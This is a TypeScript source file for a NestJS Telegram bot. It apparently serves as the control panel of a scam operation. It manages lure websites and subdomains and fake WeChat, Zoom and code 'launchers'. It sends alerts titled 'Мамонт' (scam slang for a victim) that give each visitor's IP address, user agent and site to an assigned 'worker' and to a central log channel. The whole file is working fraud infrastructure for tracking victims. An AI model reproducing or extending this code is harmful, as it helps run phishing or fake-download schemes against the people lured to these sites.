import { Injectable, Logger } from '@nestjs/common'
import { ConfigService } from 'src/config/config.service'
import { Context, Scenes, session, Telegraf } from 'telegraf'
import { BotInline } from './bot.inline'
import { BotMiddleware } from './bot.middleware'
import { PrismaService } from 'src/prisma/prisma.service'
import { HandleStart } from './handle/handle.start'
import { HandleLogs } from './handle/handle.logs'
import { HandleProfile } from './handle/handle.profile'
import { HandleWebSite } from './handle/handle.website'
import { HanldeSite } from './handle/handle.site'
import { HandleLaunch } from './handle/handle.launch'

@Injectable()
export class BotService {
  private bot: Telegraf<Context & Scenes.WizardContext>
  private readonly logger = new Logger('BotService')
  constructor (
    private readonly config: ConfigService,
    private readonly prisma: PrismaService,
    private readonly handleStart: HandleStart,
    private readonly handleLogs: HandleLogs,
    private readonly handleProfile: HandleProfile,
    private readonly handleWebsite: HandleWebSite,
    private readonly hanldeSite: HanldeSite,
    private readonly handleLaucnh: HandleLaunch,
    
  ) {
    this.bot = new Telegraf(config.TELEGRAM_BOT_TOKEN)
    this.init()
    this.bot.launch()
  }
  private init = () => {
    this.bot.use(session())
    const stage = new Scenes.Stage([this.handleWebsite.scena() as any])
    this.bot.use(stage.middleware())
    this.bot.use(new BotMiddleware(this.prisma).validateUser.bind(this))
    this.bot.command('start', this.handleStart.action)
    this.bot.action(BotInline.profile, this.handleProfile.action)
    this.bot.action(BotInline.start, this.handleStart.action)
    this.bot.action(BotInline.logs, this.handleLogs.action)
    this.bot.action(
      new RegExp(`${BotInline.logs}_(\\d+)`),
      this.handleLogs.action,
    )
    this.bot.action(BotInline.websites, this.handleWebsite.action)
    this.bot.action(
      new RegExp(`${BotInline.websites}_(\\d+)`),
      this.handleWebsite.actionById,
    )
    this.bot.action(
      new RegExp(`${BotInline.subdomainAdd}_(\\d+)`),
      this.handleWebsite.actionSubDomainAdd,
    )
    this.bot.action(
      new RegExp(`${BotInline.subdomain}_(\\d+)`),
      this.handleWebsite.subdomainById,
    )
    this.bot.action(
      new RegExp(`${BotInline.subdomainDelete}_(\\d+)`),
      this.handleWebsite.subdomainDelete,
    )
    this.bot.action(
      new RegExp(`${BotInline.site}_(\\d+)`),
      this.hanldeSite.action,
    )
    this.bot.action(
      new RegExp(`${BotInline.siteSelect}_(\\d+)_(\\d+)`),
      this.hanldeSite.actionSelect,
    )
    this.bot.action(BotInline.launcher, this.handleLaucnh.action)
    this.bot.action(BotInline.launcher_wechat, this.handleLaucnh.weChat)
    this.bot.action(BotInline.launcher_zoom, this.handleLaucnh.zoom)
    this.bot.action(BotInline.launcher_code, this.handleLaucnh.code)
  }

  newLog = async (id: number) => {
    const log = await this.prisma.log.findUnique({
      where: {
        id,
      },
      select: {
        id: true,
        ip: true,
        userAgent: true,
        createdAt: true,
        worker: {
          select: {
            id: true,
            name: true,
            telegramId: true,
            username: true,
          },
        },
        passCode: {
          select: {
            id: true,
            createdAt: true,
            worker: {
              select: {
                id: true,
                name: true,
                telegramId: true,
                username: true,
              },
            },
          },
        },
        subDomain: {
          select: {
            site: {
              select: {
                id: true,
                name: true,
              },
            },
            prefix: true,
            domain: {
              select: {
                domain: true,
              },
            },
          },
        },
      },
    })

    if (log.passCode) {
      this.bot.telegram.sendMessage(
        this.config.TELEGRAM_LOG,
        `🐘 <b>Мамонт</b>\n\n` +
          `<b>ID</b>: ${log.id} (${log.passCode.worker.telegramId})\n` +
          `<b>Работник</b>: ${log.passCode.worker.id} ${log.passCode.worker.name} @${log.passCode.worker.username}\n` +
          `<b>Секретный код</b>: ${log.passCode.id}\n` +
          `<b>Дата и время</b>: ${log.createdAt.toISOString()}\n` +
          `<b>IP</b>: ${log.ip}\n` +
          `<b>User-agent</b>: <code>${log.userAgent}</code>\n`,
        {
          parse_mode: 'HTML',
        },
      )
      this.bot.telegram.sendMessage(
        log.passCode.worker.telegramId,
        `🐘 <b>Мамонт</b>\n\n` +
          `<b>ID</b>: ${log.id} (${log.passCode.worker.telegramId})\n` +
          `<b>Секретный код</b>: ${log.passCode.id}\n` +
          `<b>Дата и время</b>: ${log.createdAt.toISOString()}\n` +
          `<b>IP</b>: ${log.ip}\n` +
          `<b>User-agent</b>: <code>${log.userAgent}</code>\n`,
        {
          parse_mode: 'HTML',
        },
      )
    } else {
      this.bot.telegram.sendMessage(
        log.worker.telegramId,
        `🐘 <b>Мамонт</b>\n\n` +
          `<b>ID</b>: ${log.id}\n` +
          `<b>Дата и время</b>: ${log.createdAt.toISOString()}\n` +
          `<b>IP</b>: ${log.ip}\n` +
          `<b>Домен</b>: ${log.subDomain.prefix}.${log.subDomain.domain.domain}\n` +
          `<b>Сайт</b>: ${log.subDomain.site.id} - ${log.subDomain.site.name}\n` +
          `<b>User-agent</b>: <code>${log.userAgent}</code>\n`,
        {
          parse_mode: 'HTML',
        },
      )
      this.bot.telegram.sendMessage(
        this.config.TELEGRAM_LOG,
        `🐘 <b>Мамонт</b>\n\n` +
          `<b>ID</b>: ${log.id} (${log.worker.telegramId})\n` +
          `<b>Работник</b>: ${log.worker.id} ${log.worker.name} @${log.worker.username}\n` +
          `<b>Дата и время</b>: ${log.createdAt.toISOString()}\n` +
          `<b>IP</b>: ${log.ip}\n` +
          `<b>Домен</b>: ${log.subDomain.prefix}.${log.subDomain.domain.domain}\n` +
          `<b>Сайт</b>: ${log.subDomain.site.id} (${log.subDomain.site.name})\n` +
          `<b>User-agent</b>: <code>${log.userAgent}</code>\n`,
        {
          parse_mode: 'HTML',
        },
      )
    }
  }
}
